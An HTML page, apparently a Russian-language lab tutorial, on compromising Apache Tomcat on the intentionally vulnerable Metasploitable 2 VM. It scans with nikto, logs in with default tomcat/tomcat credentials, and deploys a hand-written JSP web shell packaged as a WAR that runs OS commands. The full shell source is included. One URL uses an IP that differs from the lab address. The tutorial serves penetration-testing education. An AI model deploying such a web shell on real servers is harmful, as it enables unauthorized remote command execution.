@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Эксплуатирование Apache Tomcat на metasploitable-linux-2.0.0</title>
+
+	<meta name="DESCRIPTION" content="Эксплуатирование Apache Tomcat на metasploitable-linux-2.0.0">
+	<meta name="KEYWORDS" content="Эксплуатирование Apache Tomcat на metasploitable-linux-2.0.0">
+
+  <meta property="og:url"                content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2s.html" />
+  <meta property="og:type"               content="article" />
+  <meta property="og:title"              content="Ed Kurlyak - Эксплуатирование Apache Tomcat на metasploitable-linux-2.0.0" />
+  <meta property="og:description"        content="Эксплуатирование Apache Tomcat на metasploitable-linux-2.0.0" />
+  <meta property="og:image"              content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2.png" />
+
+<style type="text/css">
+body {
+	font-size: 24px;
+	font-family: "Consolas";
+	background-color: #000;
+	color: #ffffff;
+}
+
+pre {
+	font-size: 24px;
+	font-family: "Consolas";
+	background-color: #ffffaa;
+	color: #000;
+	width: max-content;
+	min-width: 100%;
+
+}
+
+div.my_selected {
+	width: 100%;
+	background-color: #ffff55;
+	position: relative;
+}
+
+a:link, a:visited { color: #aaaaaa; text-decoration: none; font-weight: normal;} 
+a:active, a:hover { color: #aaaaaa; text-decoration: underline;}
+
+p {
+	text-align: justify;
+	margin-right: 20px;
+}
+
+</style>	
+</head>
+<body>
+
+<h3>
+Часть 21. Эксплуатирование Apache Tomcat на в metasploitable-linux-2.0.0 - Способ 3
+</h3>
+
+<p>
+Предполагается что все действия выполняются на виртуальных машинах VirtualBox.
+</p>
+
+
+<p>
+Начинаем атаку на удаленную машину Metasploitable 2.
+</p>
+
+
+<p>
+Необходимо определить IP с машиной Metasploitable 2. Для этого сначала определим наш IP и маску подсети, для этого дадим команду в терминале Kali:
+</p>
+
+<p>
+ifconfig
+</p>
+
+<p>
+В результатах вывода команды выше, можно увидеть такую строку:
+</p>
+
+<p>
+inet 10.0.2.4  netmask 255.255.255.0 
+</p>
+
+<p>
+То есть наш IP 10.0.2.4 а диапазон IP адресов нашей сети 10.0.2.0/24 (это обяснялось ранее в предыдущих статьях).
+</p>
+
+<p>
+Для обнаружения других компьютеров в сети и в том числе нашей удаленной машины Metasploitable 2, дадим команду в терминале Kali:
+</p>
+
+<p>
+sudo netdiscover -r 10.0.2.0/24
+</p>
+
+<p>
+В выводе команды:
+</p>
+
+<p>
+10.0.2.2        08:00:27:3a:17:ed      1      60  PCS Systemtechnik GmbH
+10.0.2.3        08:00:27:f1:18:5a      1      60  PCS Systemtechnik GmbH
+</p>
+
+<p>
+10.0.2.2 - это виртуальный роутер, который управляет нашей сетью.
+</p>
+
+<p>
+10.0.2.3 - это наша машина (по логике) с Metasploitable 2.
+</p>
+
+<p>
+Проверим связь между нашей Kali и удаленной ВМ Metasploitable 2, дадим команду:
+</p>
+
+<p>
+ping 10.0.2.3
+</p>
+
+<p>
+Если сеть в VirtualBox настроена правильно, видим пинг идет, связь есть.
+</p>
+
+<p>
+На Kali выполняем команду в терминале:
+</p>
+
+<p>
+nikto -h 10.0.2.3:8180
+</p>
+
+<img src="./picu/pic138.jpg" width=1400 alt="kali linux терминал команда nikto">
+
+<p>
+Мы нашли логин/пароль - tomcat/tomcat.
+</p>
+
+
+<p>
+Далее необходимо проверить (команды терминала Kali):
+</p>
+
+<p>
+java -version
+<br>
+javac -version
+<br>
+jar --version
+</p>
+
+<p>
+Если jar и javac отсутствуют, установи JDK:
+</p>
+
+<p>
+sudo apt update
+<br>
+sudo apt install default-jdk
+</p>
+
+<p>
+В предыдущей статье мы использовали msfvenom для создания webshell - в этой статье webshell.war мы будем создавать самостоятельно.
+</p>
+
+<p>
+Сначала нужно создать файл index.jsp командой терминала Kali:
+</p>
+
+<p>
+nano index.jsp
+</p>
+
+<p>
+В открытый файл index.jsp скопируйте код ниже:
+</p>
+
+<textarea rows="23" cols="80" readonly>
+
+<FORM METHOD=GET ACTION='index.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+<%@ page import="java.io.*" %>
+<%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) { output += s+"</br>"; }
+      }  catch(IOException e) {   e.printStackTrace();   }
+   }
+%>
+<pre><%=output %></pre>
+
+</textarea>
+
+
+
+
+
+<p>
+Далее команды:
+</p>
+
+<p>
+mkdir webshell
+<br>
+cp index.jsp webshell
+<br>
+<br>
+cd webshell
+<br>
+jar -cvf ../webshell.war *
+</p>
+
+<img src="./picu/pic151.jpg" width=1400 alt="kali linux браузер">
+
+<p>
+Далее в Kali открываем браузер, вводим адрес:
+</p>
+
+<p>
+http://10.0.2.3:8180/manager/html
+</p>
+
+<p>
+На запрос логин/пароль вводим tomcat/tomcat и нажимаем Sign In:
+</p>
+
+<img src="./picu/pic143.jpg" width=1400 alt="kali linux браузер">
+
+<p>
+После входа листаем вниз до секции:
+</p>
+
+<p>
+WAR file to deploy
+</p>
+
+<p>
+Жмем кнопку Browse, выбираем у нас на диске файл webshell.war, жмем Deploy:
+</p>
+
+
+<img src="./picu/pic152.jpg" width=1400 alt="kali linux браузер">
+
+<br>
+<br>
+
+<img src="./picu/pic153.jpg" width=1400 alt="kali linux браузер">
+
+
+<p>
+Следующий шаг в браузере Kali перейти по адресу (или в панели управления нажать /webshell):
+</p>
+
+<p>
+http://192.168.79.179:8180/webshell/index.jsp
+</p>
+
+
+
+<p>
+Далее в окне браузера в поле ввода вводим команды OC например:
+</p>
+
+<p>
+whoami
+</p>
+
+<p>
+И видим ответ:
+</p>
+
+<p>
+tomcat55
+</p>
+
+<p>
+таким образом мы получили удаленную возможность выполнять команды ОС.
+</p>
+
+<img src="./picu/pic154.jpg" width=1400 alt="kali linux браузер">
+
+<img src="./picu/pic155.jpg" width=1400 alt="kali linux браузер">
+
+</body>
+</html>
